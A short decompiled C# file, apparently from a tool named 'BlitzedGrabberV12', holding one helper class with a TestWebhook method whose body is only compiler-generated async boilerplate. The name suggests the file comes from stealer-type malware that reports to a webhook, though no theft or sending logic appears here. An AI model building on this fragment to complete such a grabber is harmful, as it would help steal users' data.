using System;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

namespace BlitzedGrabberV12.Helpers
{
	// Token: 0x0200000B RID: 11
	public static class Wh
	{
		// Token: 0x0600002B RID: 43 RVA: 0x000027A0 File Offset: 0x000009A0
		public static Task TestWebhook(string url)
		{
			Wh.<TestWebhook>d__0 <TestWebhook>d__;
			<TestWebhook>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<TestWebhook>d__.url = url;
			<TestWebhook>d__.<>1__state = -1;
			<TestWebhook>d__.<>t__builder.Start<Wh.<TestWebhook>d__0>(ref <TestWebhook>d__);
			return <TestWebhook>d__.<>t__builder.Task;
		}
	}
}
